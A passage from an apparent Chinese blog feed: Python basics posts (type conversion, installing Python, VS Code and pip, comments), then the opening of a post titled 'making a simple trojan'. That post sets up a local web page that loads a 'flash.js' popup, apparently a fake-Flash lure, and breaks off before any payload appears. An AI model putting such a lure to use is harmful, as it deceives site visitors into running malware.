class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">a = <span class="hljs-string">&#x27;123&#x27;</span>   <span class="hljs-meta">#a是字符串类型</span><br><span class="hljs-keyword">print</span>(<span class="hljs-built_in">int</span>(a))    <span class="hljs-meta">#将字符串转换为整型</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%AD%A3%E5%B8%B8int%EF%BC%88%EF%BC%89%E8%BD%AC%E6%8D%A2.png" alt="正常int（）转换"></p></li><li><p>使用float()转换时也不能带有非法字符，如：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%AD%A3%E5%B8%B8float()%E8%BD%AC%E6%8D%A2.png" alt="正常float()转换"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgfloat()%E8%BD%AC%E6%8D%A2.png" alt="float()转换"></p><p>在使用整型数据转换成浮点型时转换后，如：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgint%E8%BD%AC%E6%8D%A2%E6%88%90float%E7%B1%BB%E5%9E%8B.png" alt="int转换成float类型"></p><p>在网页爬取时经常使用string类型转换成float类型</p></li><li><p>使用str()转换时必须写<em>str</em>而不能写<em>string</em>，转换Boolean类型时，如：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgbool%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E4%B8%BAstring%E7%B1%BB%E5%9E%8B.png" alt="bool类型转换为string类型"></p><p>可以看出打印的值是True而不是1。</p></li><li><p>1.<strong>使用bool()转换时对于整型1和2等等非零整数都转换为True：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgbool%E7%B1%BB%E5%9E%8B%E9%9D%9E%E9%9B%B6%E8%BD%AC%E6%8D%A2.png" alt="bool类型非零转换"></p><p>2.<strong>负数同样也是Ture：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgbool()%E8%B4%9F%E6%95%B0%E8%BD%AC%E6%8D%A2.png" alt="bool()负数转换"></p><p>3.<strong>0为False：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgbool()%E9%9B%B6%E8%BD%AC%E6%8D%A2.png" alt="bool()零转换"></p><p>4.<strong>-0也为False：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgbool()%E8%B4%9F%E9%9B%B6%E8%BD%AC%E6%8D%A2.png" alt="bool()负零转换"></p><p>5.<strong>浮点数类型和整型转化为bool类型的情况相同</strong></p><p>6.<strong>只要字符串中有内容，在强制类型转换为bool时其值都为True：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgbool()%E8%BD%AC%E6%8D%A2%E6%9C%89%E5%AD%97%E7%AC%A6%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2.png" alt="bool()转换有字符的字符串"></p><p>7.<strong>当字符串中没有字符则显示False：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgbool()%E8%BD%AC%E6%8D%A2%E7%A9%BA%E5%AD%97%E7%AC%A6%E4%B8%B2.png" alt="bool()转换空字符串"></p><p>8.<strong>如果列表、元组、字典中有数据，强制类型转换为bool时则显示为True。没有数据就会显示为False：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgbool()%E5%88%97%E8%A1%A8%E6%9C%89%E6%95%B0%E6%8D%AE.png" alt="bool()列表有数据"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgbool()%E5%88%97%E8%A1%A8%E6%9C%89%E6%95%B0%E6%8D%AE.png" alt="bool()列表有数据"></p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python基础-1（python编译器和python注释）</title>
    <link href="/2023/11/30/python%E5%9F%BA%E7%A1%80%EF%BC%88python%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8Cpython%E6%B3%A8%E9%87%8A%EF%BC%89/"/>
    <url>/2023/11/30/python%E5%9F%BA%E7%A1%80%EF%BC%88python%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8Cpython%E6%B3%A8%E9%87%8A%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="python基础（1）"><a href="#python基础（1）" class="headerlink" title="python基础（1）"></a>python基础（1）</h2><h3 id="python下载"><a href="#python下载" class="headerlink" title="python下载"></a>python下载</h3><p>进入python官网下载：<a href="https://www.python.org/">Welcome to Python.org</a>。</p><p>需选择python的版本及适配的位数。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-545ef70ae81b711e88d95aef3e7d87b4_1440w.webp" alt="img"></p><p>首先看版本，x86-64是64位版本，x86是32位版本，你需要下载跟你电脑系统一致的版本。<br>怎么看自己的电脑是什么版本？</p><p><strong>右键计算机-属性</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-951301a274ec9565d21fcfe4925dcaf2_1440w.webp" alt="img"></p><p><strong>查看一下系统类型</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-af7c4af9d7873e58320c18bc205901ac_1440w.webp" alt="img"></p><p>然后下载对应位数的版本。</p><p><strong>下载完后打开</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-41f31563abd07b3b1b9e1a504b606b02_1440w.webp" alt="img"></p><p>出现这个界面的话，说明你的电脑已经安装过Python了，直接关掉窗口，跳到教程的下一步。<br>第一次安装的话，是这个界面。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-ac33c2a599ab543a2d029540306e4122_1440w.webp" alt="img"></p><p><code>add python 3.9 to PATH</code>是将python3.9的环境加入到PATH中。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-c26357028c8f22e64568cf4770a94708_1440w.webp" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-56da688d1d6c4989d90571accaa5bd57_1440w.webp" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-8b5bdbb6d0e42e694e938a540294ce21_1440w.webp" alt="img"></p><p>安装成功！<br>测试一下，能否调用，同时按下win+R（win就是开始菜单的那个键）</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-b58513882e44469d943522eea603ca3f_1440w.webp" alt="img"></p><p>进入命令行，输入python，出现这样的界面则表示成功安装</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-7d9de2cb7046da25571f8906cb30084b_1440w.webp" alt="img"></p><p>这样我们第一步已经完成了，电脑已经学会了Python语言。<br>输入print(‘Hello World!’)，写下你的第一句Python代码。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-7a7eeb18c02940e1030bef8af103f6ee_1440w.webp" alt="img"></p><p><strong>Welcome To Python’s World！！</strong><br>欢迎来到Python的世界里，不过我们不会在这个黑框框里面写代码的，还需要另外安装编辑器。<br>ctrl+z后，回车即退出Python环境。另外，我们还要测试一下pip是否安装完毕，它是用来安装第三方库的神器，我们以后会接触到。</p><p>退出Python环境后，我们直接在这里面输入pip，然后回车。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-5319eecaf38f72c3220996620e6885c7_1440w.webp" alt="img"></p><p>这样就是安装完毕的意思了</p><h3 id="安装编辑器"><a href="#安装编辑器" class="headerlink" title="安装编辑器"></a>安装编辑器</h3><p>我这里安装vscode，适配多种语言可扩展程序多，使用方便。</p><p>1.下载</p><p>到<a href="https://code.visualstudio.com/">Visual Studio Code - Code Editing. Redefined</a>官网</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgvscode%E4%B8%8B%E8%BD%BD.png" alt="vscode下载"></p><p><strong>User Installer</strong>版：会安装在当前计算机帐户目录,意味着如果使用另一个帐号登陆计算机将无法使用别人安装的vscode。</p><p><strong>System Installer</strong>版：安装在非用户目录,例如C盘根目录,任何帐户都可以使用。(建议使用此版本)</p><p>vscode默认提供的<strong>User Installer</strong>版,大多数人都是用的这个版本。</p><p>2.安装</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-a761d01b3692c069cace577c0ae2be69_1440w.webp" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-0416349e4b50b4aa79d63571332f3755_1440w.webp" alt="img"></p><p>其他：</p><p>①将“通过code 打开“操作添加到windows资源管理器文件上下文菜单</p><p>②将“通过code 打开”操作添加到windows资源管理器目录上下文菜单</p><p>说明：①②勾选上，可以对文件，目录点击鼠标右键，选择使用 VScode 打开。</p><p>③将code注册为受支持的文件类型的编辑器</p><p>说明：默认使用 VScode 打开诸如 txt,py 等文本类型的文件，一般建议不勾选。</p><p>让 VScode 支持的代码文件全部变成 VScode 默认打开，文件图标也会随之更改，很好辨认。</p><p>④添加到PATH（重启后生效）</p><p>说明：这步骤默认的，勾选上，不用配置环境变量，可以直接使用。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-f687f6c6ff9973b459e79a3cf9ed8d1d_1440w.webp" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-ed2487899ab4431f75e338181533220c_1440w.webp" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-30b8009be5952a2da2ab1bbf882b9977_1440w.webp" alt="img"></p><p>3.配置</p><p>安装中文语言包</p><p>在扩展中输入<em>chinese</em>，选择中文简体下载。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgchinese.png" alt="chinese"></p><p>输入<em>python</em>，下载python插件。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgpython.png" alt="python"></p><p>输入<em>code run</em>，下载code runner（使代码能在vscode上运行）。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgcode%20run.png" alt="code run"></p><p>现在就可以在VScode上写python代码了。</p><h3 id="pip的使用"><a href="#pip的使用" class="headerlink" title="pip的使用"></a>pip的使用</h3><p><code>win + r</code> 输入cmd进入命令行模式，输入<code>pip -V</code>(大写V)，查看的版本：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-491aea1a8aadfe360c6babf62719f77c_1440w.webp" alt="img"></p><p><strong>注意提示中的Python路径和版本！搞清楚了这点，你就不会搞错了。</strong></p><h4 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h4><p>那么，如果很不巧，你的Python版本下恰好没有pip这个工具，怎么办呢？解决办法很多！</p><ol><li>使用easy_install安装： 各种进入到easy_install脚本的目录下，然后运行<code>easy_inatall pip</code></li><li>使用get-pip.py安装： 在下面的url下载get-pip.py脚本 <code>curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py</code> 然后运行：<code>python get-pip.py</code> 这个脚本会同时安装setuptools和wheel工具。</li><li>在linux下使用包管理工具安装pip： 例如，ubuntu下：<code>sudo apt-get install python-pip</code>。Fedora系下：<code>sudo yum install python-pip</code></li><li>在windows下安装pip： 在C:\python27\scirpts下运行<code>easy_install pip</code>进行安装。</li></ol><p>刚安装完毕的pip可能需要先升级一下自身： 在Linux或masOS中：<code>pip install -U pip</code> 在windows中：<code>python -m pip install -U pip</code></p><h4 id="pip的基础使用"><a href="#pip的基础使用" class="headerlink" title="pip的基础使用"></a>pip的基础使用</h4><p>在命令行下，输入pip，回车可以看到帮助说明：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-18bb3ebd8c519581d6a751ece9be85fc_1440w.webp" alt="img"></p><p>1.普通安装</p><p><strong>再次强调，使用pip前请务必确认其所对应的Python解释器必须是你想要的那个！</strong></p><p>以安装pillow模块为例。输入<code>pip install pillow</code>，安装过程如下图：</p><p>2.指定版本安装</p><p>安装特定版本的package，通过使用&#x3D;&#x3D;, &gt;&#x3D;, &lt;&#x3D;, &gt;, &lt;来指定一个版本号。 <code>pip install &#39;Markdown&lt;2.0&#39;</code> <code>pip install &#39;Markdown&gt;2.0,&lt;2.0.3</code></p><p>3.卸载已安装的库</p><p><code>pip uninstall pillow</code></p><p>4.列出已经安装的库</p><p><code>pip list</code></p><p>5.将已经安装的库列表保存到文本文件中</p><p><code>pip freeze &gt; requirements.txt</code></p><p>这个功能非常常用、好用！经常被用作项目环境依赖文件。</p><p>6.根据依赖文件批量安装库</p><p><code>pip install -r requirements.txt</code></p><p>使用上面的txt文件，批量安装第三方库。</p><p>7.使用wheel文件安装</p><p>除了使用上面的方式联网进行安装外，还可以将安装包也就是wheel格式的文件，下载到本地，然后使用pip进行安装。比如我在PYPI上提前下载的pillow库的wheel文件，后缀名为whl。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-df0335f9b782b600f66b4768637277e7_1440w.webp" alt="img"></p><p>可以使用<code>pip install pillow-4.2xxxxxxx.whl</code>的方式离线进行安装</p><h4 id="pip源"><a href="#pip源" class="headerlink" title="pip源"></a>pip源</h4><p>很多时候，比如网络不给力，连接超时、防火墙阻挡等等各种原因，我们可能无法从Python官方的PyPi仓库进行pip安装，这时候可以选择国内的第三方源，推荐使用豆瓣源，速度不错。</p><p>使用方法：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">pip install -i https:<span class="hljs-regexp">//</span>pypi.doubanio.com<span class="hljs-regexp">/simple/</span> --trusted-host pypi.doubanio.com pillow<br></code></pre></td></tr></table></figure><p>需要注意的是，除了最后的pillow用你所期望的库名替代外，前面的参数都是固定写法，包括参数顺序。</p><p>一些国内的源：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">新版ubuntu要求使用https源，要注意。<br><br>清华：https:<span class="hljs-regexp">//</span>pypi.tuna.tsinghua.edu.cn/simple<br><br>阿里云：http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/pypi/</span>simple/<br><br>中国科技大学 https:<span class="hljs-regexp">//</span>pypi.mirrors.ustc.edu.cn<span class="hljs-regexp">/simple/</span><br><br>华中理工大学：http:<span class="hljs-regexp">//</span>pypi.hustunique.com/<br><br>山东理工大学：http:<span class="hljs-regexp">//</span>pypi.sdutlinux.org/ <br><br>豆瓣：http:<span class="hljs-regexp">//</span>pypi.douban.com<span class="hljs-regexp">/simple/</span><br></code></pre></td></tr></table></figure><hr><h3 id="python运行"><a href="#python运行" class="headerlink" title="python运行"></a>python运行</h3><p>3种运行python文件的方法</p><p>1.在命令行模式下运行</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%BF%90%E8%A1%8C.png" alt="命令行运行"></p><p><em>只能一行一行运行且无法保存</em></p><p>使用<code>exit()</code>或<code>ctrl + z +enter键</code>退出python程序</p><p>2.使用记事本运行</p><p>新建一个记事本将文件后缀名改成py，打开cmd输入<code>python  + 文件地址（可以直接将文件拖到cmd中）</code>就可以运行1.py文件。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%AE%B0%E4%BA%8B%E6%9C%AC.png" alt="记事本"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%96%87%E4%BB%B6%E8%BF%90%E8%A1%8C.png" alt="文件运行"></p><p>3.使用vscode</p><p>  自从vs面世之后，她就被冠以了地表最强IDE的名号。这不仅仅是由于她完备的代码开发、调试、管理功能，更是因为她专门为提高编程速度而进行的一系列调整优化。这其中，强大的自动补全功能以及各种功能人性化的快捷键，对提升编程速度，改善编程体验起到了至关重要的作用。<br>  VSCode则是微软延续了VS的优点，而推出的一款源代码编辑器。除了VS的优点之外，她还：</p><p>支持了Linux，在跨平台上迈出了一大步；<br>更为轻量化，更加方便实用，在任何平台上快速配置环境都更加方便；<br>独特的插件系统，使得VS Code的功能扩展有了无限的可能性；</p><p>使用vscode编程</p><p>（1）<code>ctrl + n</code>新建一个文件；</p><p>（2）输入<code>print(&#39;Hello World!&#39;)</code>；</p><p>（3）<code>ctrl + s</code>保存，保存到一个合适的目录并命名为<code>helloworld.py</code></p><p>（4）右键点击<code>run code</code>运行代码。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%BF%90%E8%A1%8C.png" alt="运行"></p><p>快捷键<br>  快捷键是让人爱不释手的基本工具，有了它，你在编程是甚至不需要鼠标，就能随心所欲的操作代码。下面列出一些我常用的快捷键</p><table><thead><tr><th>快捷键</th><th>功能</th></tr></thead><tbody><tr><td>Ctrl+&#96;（esc下面的键）</td><td>打开vscode终端</td></tr><tr><td>F2</td><td>重命名</td></tr><tr><td>F11</td><td>全屏</td></tr><tr><td>Ctrl+C</td><td>复制当前行&#x2F;选中内容</td></tr><tr><td>Ctrl+V</td><td>黏贴当前行&#x2F;选中内容</td></tr><tr><td>Ctrl+F</td><td>查找</td></tr><tr><td>Ctrl+H</td><td>替换</td></tr><tr><td>Ctrl+Z</td><td>撤销</td></tr><tr><td>Ctrl+Y</td><td>重做</td></tr><tr><td>Ctrl+D</td><td>选中当前半高亮内容（多次点击可选中下一个匹配的半高亮内容）</td></tr><tr><td>Ctrl+N</td><td>新建文件</td></tr><tr><td>Ctrl+Shift+N</td><td>打开新的VS Code编辑器窗口</td></tr><tr><td>Ctrl+W</td><td>关闭当前页面</td></tr><tr><td>Ctrl+Shift+W</td><td>关闭当前窗口</td></tr><tr><td>Ctrl+[&#x2F;]</td><td>代码向左&#x2F;右缩进</td></tr><tr><td>Alt+↓&#x2F;↑</td><td>向上&#x2F;下移动当前行</td></tr><tr><td>Shift+Alt+↓&#x2F;↑</td><td>在当前行下方插入一行</td></tr><tr><td>Ctrl+Enter</td><td>在当前行下方插入一行</td></tr><tr><td>Ctrl+Shift+Enter</td><td>在当前行上方插入一行</td></tr><tr><td>Shift+Alt+鼠标左键   &#x2F;Ctrl+Shift+↓&#x2F;↑</td><td>多行编辑</td></tr></tbody></table><h4 id="设置python文件的文件头"><a href="#设置python文件的文件头" class="headerlink" title="设置python文件的文件头"></a>设置python文件的文件头</h4><p>打开VsCode依次单击菜单栏 文件（File）–&gt;首选项（Preferences）–&gt;配置用户代码片段（User Snippets）</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-1643d7cd89dae36741a18e7fe7da8654_1440w.webp" alt="img"></p><p>然后输入框中输入python后会生成python.json文件</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgv2-13df53e7d3dc0c9ddd910f23b7afe6b3_1440w.webp" alt="img"></p><p>将该文件内容替换为以下内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;HEADER&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prefix&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;header&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;body&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-string">&quot;#!/usr/bin/env python&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;# -*- coding: utf-8 -*-&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;&#x27;&#x27;&#x27;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;@File    :   $TM_FILENAME&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;@Time    :   $CURRENT_YEAR/$CURRENT_MONTH/$CURRENT_DATE $CURRENT_HOUR:$CURRENT_MINUTE:$CURRENT_SECOND&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;@Author  :   jumploop &quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;@Version :   1.0&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;@Desc    :   None&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;&#x27;&#x27;&#x27;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>        <br>        <span class="hljs-string">&quot;$0&quot;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>使用<code>ctrl + s</code>保存。</p><p>打开一个新的python文件，然后在头部敲入header即可自动弹出下面的注释：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgheader.png" alt="header"></p><h3 id="python注释"><a href="#python注释" class="headerlink" title="python注释"></a>python注释</h3><p>在 Python3 中，注释不会影响程序的执行，但是会使代码更易于阅读和理解。</p><p>Python 中的注释有<strong>单行注释</strong>和<strong>多行注释</strong>。</p><p><strong>Python 中单行注释以 *<em>#*</em> 开头</strong>，例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">这是一个注释 <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello, World!&quot;</span>)</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">符号后面的所有文本都被视为注释，不会被解释器执行。</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E5%8D%95%E8%A1%8C%E6%B3%A8%E9%87%8A.png" alt="单行注释"></p><h4 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h4><p>在 Python中，多行字符串（由三个单引号 <strong>‘’’</strong> 或三个双引号 <strong>“””</strong> 包围的文本块）在某些情况下可以被视为一种实现多行注释的技巧。</p><p><strong>多行注释用三个单引号 <em>‘’’</em> 或者三个双引号 <em>“””</em> 将注释括起来</strong>，例如</p><h4 id="1、单引号（’’’）"><a href="#1、单引号（’’’）" class="headerlink" title="1、单引号（’’’）"></a>1、单引号（’’’）</h4><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">#!/usr/bin/python3 <br>&#x27;&#x27;&#x27;<br>这是多行注释，用三个单引号<br>这是多行注释，用三个单引号 <br>这是多行注释，用三个单引号<br>&#x27;&#x27;&#x27;<br>print(&quot;Hello, World!&quot;)<br></code></pre></td></tr></table></figure><h4 id="2、双引号（”””）"><a href="#2、双引号（”””）" class="headerlink" title="2、双引号（”””）"></a>2、双引号（”””）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3 </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">这是多行注释（字符串），用三个双引号</span><br><span class="hljs-string">这是多行注释（字符串），用三个双引号 </span><br><span class="hljs-string">这是多行注释（字符串），用三个双引号</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello, World!&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E5%A4%9A%E8%A1%8C%E6%B3%A8%E9%87%8A.png" alt="多行注释"></p><p><em><code>ctrl + /</code>可以将鼠标点击行进行注释，若鼠标同时选中多行就会注释多行</em></p><p><strong>注意</strong>：多行注释可以嵌套使用，但是单行注释不能嵌套使用。</p><p><strong>注意</strong>：虽然多行字符串在这里被当作多行注释使用，但它实际上是一个字符串，我们只要不使用它，它不会影响程序的运行。</p><p>这些字符串在代码中可以被放置在一些位置，而不引起实际的执行，从而达到注释的效果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>制作简单的木马</title>
    <link href="/2023/11/29/%E5%88%B6%E4%BD%9C%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%A8%E9%A9%AC/"/>
    <url>/2023/11/29/%E5%88%B6%E4%BD%9C%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%A8%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h2 id="打开网页"><a href="#打开网页" class="headerlink" title="打开网页"></a>打开网页</h2><p>1.下载<a href="https://www.xp.cn/">小皮面板(phpstudy) - 让天下没有难配的服务器环境！ (xp.cn)</a>并打开phpstudy。</p><p>2.打开phpstudy并开启apache服务。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%89%93%E5%BC%80apache.png" alt="打开apache"></p><p>3.点击网站，点击管理，打开网页根目录。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%89%93%E5%BC%80%E6%A0%B9%E7%9B%AE%E5%BD%95.png" alt="打开根目录"></p><p>4.新建一个文本文档，将其重命名为1.html.</p><p>5.使用VScode打开（若没有vscode可以使用记事本打开）。</p><p>（1）有vscode打开后就可以在界面中输入英文的!，再按tab或enter键就可以生成一个基础的html页面格式。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1%EF%BC%81.png" alt="1！"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imghtml%E6%A0%87%E5%87%86%E7%BD%91%E9%A1%B5.png" alt="html标准网页"></p><p>（2）没有vscode则需手动输入上述代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>6.最后在body的标签中写入<code>&lt;h1&gt;hello world&lt;/h1&gt;</code>，在网页中输入<code>127.0.0.1/1.html</code>生成网页。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imghello%20world.png" alt="hello world"></p><h2 id="在网页中生成弹窗"><a href="#在网页中生成弹窗" class="headerlink" title="在网页中生成弹窗"></a>在网页中生成弹窗</h2><p>在1.html中的body标签里加入<code>&lt;script src=&quot;./flash.js&quot;&gt;&lt;/script&gt;</code>,此时刷新网页生成</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E5%BC%B9%E7%AA%97.png" alt="弹窗"></p><h2 id="提高弹窗功能"><a href="#提高弹窗功能" class="headerlink" title="提高弹窗功能"></a>提高弹窗功能</h2><p>现在点击弹窗页面会报出403的错误，但是将上述的flash.js文件照如下图更改：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9B%B4%E6%94%B9js.png" 